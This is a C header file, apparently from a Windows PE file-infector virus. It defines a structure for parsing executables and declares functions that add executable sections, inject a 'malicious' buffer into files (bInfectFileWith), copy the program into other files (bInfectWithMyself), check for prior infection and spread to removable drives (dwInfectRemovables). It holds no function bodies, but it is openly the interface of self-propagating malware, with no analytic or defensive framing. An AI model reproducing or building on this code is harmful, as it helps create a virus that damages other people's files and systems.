#ifndef PE_INFECT_H
#define PE_INFECT_H

#include "loader.h"


#define STRINGIFY(s) #s
#define MAKE_STR(s) STRINGIFY(s)

typedef struct ParsedPE
{
    BOOL valid;
    BYTE* ptrToBuf;
    SIZE_T bufSiz;
    PIMAGE_DOS_HEADER hdrDos;
    PIMAGE_FILE_HEADER hdrFile;
    PIMAGE_OPTIONAL_HEADER hdrOptional;
    PIMAGE_SECTION_HEADER hdrSection;
    PIMAGE_DATA_DIRECTORY dataDir;
    /* dll stuff */
    BOOL hasDLL;
    BYTE* ptrToDLL;
    SIZE_T sizOfDLL;
    /* loader stuff */
    BOOL hasLdr;
    BYTE* ptrToLdr;
    SIZE_T sizOfLdr;
    struct loader_x86_data* loader86;
} __attribute__((packed, gcc_struct)) ParsedPE;


void setOrigLoader(const struct loader_x86_data* ldr);

const struct loader_x86_data* getOrigLoader(void);

void setImageBase(DWORD newBase);

DWORD getImageBase(void);

void setImageSize(DWORD newSize);

DWORD getImageSize(void);

void setSectionAdr(DWORD newAdr);

DWORD getSectionAdr(void);

BYTE* getLoader(SIZE_T* pSiz);

SIZE_T getRealLoaderSize(void);

BYTE* PtrFromOffset(BYTE* base, DWORD offset);

DWORD RvaToOffset(const struct ParsedPE* ppPtr, DWORD dwRva);

BYTE* RvaToPtr(const struct ParsedPE* ppPtr, DWORD dwRva);

DWORD OffsetToRva(const struct ParsedPE* ppPtr, DWORD offset);

DWORD PtrToOffset(const struct ParsedPE* ppPtr, const BYTE* ptr);

DWORD PtrToRva(const struct ParsedPE* ppPtr, const BYTE* ptr);

BOOL bParsePE(BYTE* buf, const SIZE_T szBuf, struct ParsedPE* ppPtr, BOOL earlyStage);

BOOL bCheckEndMarker(const struct ParsedPE *ppPtr);

BOOL bAddSection(const char* sName, const BYTE* sectionContentBuf, SIZE_T szSection, BOOL executable, struct ParsedPE* ppPtr);

BOOL bInfectFileWith(const char* sFile, const BYTE* maliciousBuf, SIZE_T maliciousSiz);

BOOL bInfectWithMyself(const char* sFile);

BOOL bIsInfected(const struct ParsedPE* ppPtr);

void* pGetSegmentAdr(const char* sName, BOOL caseSensitive, const struct ParsedPE* ppPtr, SIZE_T* pSegSiz);

DWORD dwDoRebase(void* dllSectionAdr, SIZE_T dllSectionSiz, const void* dllBaseAdr);

DWORD dwInfectRemovables(void);

DWORD dwCountNonSystemImportLibs(const struct ParsedPE* ppPtr);

FARPROC WINAPI fnMyGetProcAddress(HMODULE hModule, LPCSTR szProcName);

#endif
